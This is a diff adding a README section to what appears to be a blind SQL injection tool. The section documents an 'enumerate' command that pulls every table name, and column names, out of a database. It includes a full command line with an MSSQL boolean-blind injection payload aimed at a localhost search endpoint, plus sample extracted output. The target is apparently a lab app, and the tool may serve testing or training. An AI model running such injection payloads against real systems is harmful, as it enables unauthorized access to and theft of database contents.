@@ -183,6 +183,31 @@ python -m blindsqli extract \
 If auto-calibration cannot find a side channel it will tell you, so you can
 inspect the app and tune `--base-payload`, `--param`, or the classifier config.
 
+## Extracting ALL table names
+
+`extract --preset first-table` recovers only the first table. To get **every**
+table name, use the `enumerate` command: it discovers the row count and then
+extracts each name, reusing one engine so the character/sequence predictors keep
+learning across names (later `jun_` names cost fewer requests).
+
+```bash
+python -m blindsqli enumerate \
+  --url http://localhost:3000/search --method POST \
+  --body-mode json --param "[0].value" --json-template '[{"value":"juniper"}]' \
+  --base-payload "juniper' AND 1=(SELECT CASE WHEN ({condition}) THEN 1 ELSE 'a' END)-- " \
+  --dialect mssql --output all_tables.json -v
+```
+
+Output is a JSON list:
+
+```json
+{ "what": "tables", "count": 3,
+  "values": ["jun_notes", "jun_roles", "jun_users"] }
+```
+
+Enumerate a table's columns with `--what columns --table jun_users`, and cap the
+number of rows with `--limit N`.
+
 ---
 
 ## Configuration
